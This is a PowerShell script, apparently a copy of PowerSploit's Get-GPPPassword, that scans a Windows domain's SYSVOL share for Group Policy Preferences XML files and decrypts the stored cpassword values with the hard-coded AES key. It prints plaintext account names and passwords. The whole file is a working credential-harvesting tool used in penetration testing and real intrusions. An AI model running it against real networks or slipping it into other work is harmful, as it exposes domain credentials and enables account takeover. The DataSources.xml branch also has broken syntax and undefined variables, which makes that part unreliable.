function Get-GPPPassword {
<#
.SYNOPSIS

    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.EXAMPLE

    Get-GPPPassword

.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
    
	[CmdletBinding()]
	Param ()
	
	#define helper function that decodes and decrypts password
	function Get-DecryptedCpassword {
		Param (
		[string] $Cpassword 
		)

		try {
			#Append appropriate padding based on string length  
			$Mod = ($Cpassword.length % 4)
			if ($Mod -ne 0) {$Cpassword += ('=' * (4 - $Mod))}

			$Base64Decoded = [Convert]::FromBase64String($Cpassword)
			
			#Create a new AES .NET Crypto Object
			$AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
			[Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
			0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
			
			#Set IV to all nulls to prevent dynamic generation of IV value
			$AesIV = New-Object Byte[]($AesObject.IV.Length) 
			$AesObject.IV = $AesIV
			$AesObject.Key = $AesKey
			$DecryptorObject = $AesObject.CreateDecryptor() 
			[Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
			
			return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
		} 
		
		catch {Write-Error $Error[0]}
	}  

	#ensure that machine is domain joined and script is running as a domain account
	if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) )
	{
		throw 'Machine is not joined to a domain.'
	}
	
	#discover potential files containing passwords ; not complaining in case of denied access to a directory
	$XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
	
	if ( -not $XMlFiles )
	{
		throw 'No files containing encrypted passwords found.'
	}
	$Results=@()
	foreach ($File in $XMLFiles) {
		
		try {
			$Filename = $File.Name
			$Filepath = $File.VersionInfo.FileName

			#put filename in $XmlFile
			[xml] $Xml = Get-Content ($File)

			#declare blank variables
			$Cpassword = ''
			$UserName = ''
			$NewName = ''
			$Changed = ''
			$Action= ''
			$TmpAction= ''
			
			switch ($Filename) {

				'Groups.xml' { 
					$Xml.Groups.User | % {
						$user =$_
						$Cpassword = $user.Properties.cpassword
						$UserName = $user.Properties.userName
						$NewName = $Xml.Groups.User.Properties.newName
						$Changed = $user.changed
						$TmpAction =$user.Properties.action
						switch ($TmpAction){
							"c" {$Action="Create"}
							"u" {$Action="Update"}
							"r" {$Action="Replace"}
							"d" {$Action="Delete"}
						}
						
						if ($Cpassword) {$Password = Get-DecryptedCpassword $Cpassword
							$ObjectProperties = @{'File' = $Filepath;
								'Password' = $Password;
								'UserName' = $UserName;
								'Changed' = $Changed;
								'NewName' = $NewName;
								'Action' =$Action;
							}
							$ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
							$Results+=$ResultsObject
						}
					}
				}
				
				'Services.xml' {
					$Xml.NTServices.NTService | % {
						$NTService =$_
						$Cpassword = $NTService.Properties.cpassword
						$UserName = $NTService.Properties.accountName
						$Changed = $NTService.changed
						$TmpAction =$NTService.Properties.action
						switch ($TmpAction){
							"c" {$Action="Create"}
							"u" {$Action="Update"}
							"r" {$Action="Replace"}
							"d" {$Action="Delete"}
						}				
						if ($Cpassword) {$Password = Get-DecryptedCpassword $Cpassword
							$ObjectProperties = @{'File' = $Filepath;
								'Password' = $Password;
								'UserName' = $UserName;
								'Changed' = $Changed;
								'NewName' = $NewName;
								'Action' =$Action;
							}
							$ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
							$Results+=$ResultsObject
						}
					}
				}
				'Scheduledtasks.xml' {
					$Xml.ScheduledTasks.Task | % {
						$Task= $_
						$Cpassword = $Task.Properties.cpassword
						$UserName = $Task.Properties.runAs
						$Changed = $Task.changed
						$TmpAction =$Task.Properties.action
						switch ($TmpAction){
							"c" {$Action="Create"}
							"u" {$Action="Update"}
							"r" {$Action="Replace"}
							"d" {$Action="Delete"}
						}				
						if ($Cpassword) {$Password = Get-DecryptedCpassword $Cpassword
							$ObjectProperties = @{'File' = $Filepath;
								'Password' = $Password;
								'UserName' = $UserName;
								'Changed' = $Changed;
								'NewName' = $NewName;
								'Action' =$Action;
							}
							$ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
							$Results+=$ResultsObject
						}
					}
				}
				
				'DataSources.xml' {
					$DataSource= $Xml.DataSources.DataSource %{
						$Cpassword = $DataSource.Properties.cpassword
						$UserName = $DataSource.Properties.username
						$Changed = $DataSources.DataSource.changed
						$TmpAction =$DataSources.User.Properties.action
						switch ($TmpAction){
							"c" {$Action="Create"}
							"u" {$Action="Update"}
							"r" {$Action="Replace"}
							"d" {$Action="Delete"}
						}				
						if ($Cpassword) {
							$Password = Get-DecryptedCpassword $Cpassword
							$ObjectProperties = @{'File' = $Filepath;
								'Password' = $Password;
								'UserName' = $UserName;
								'Changed' = $Changed;
								'NewName' = $NewName;
								'Action' =$Action;
							}
							$ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
							$Results+=$ResultsObject
						}
					}
				}

				

				
			}
			
		}
		catch {
				Write-Error $Error[0]
			}
		}
		
		$Results | Select-Object Username,Password,Changed,Action,File|Sort-Object  -property @{Expression="Changed";Descending=$true}, @{Expression="Username";Descending=$false} 					
	}
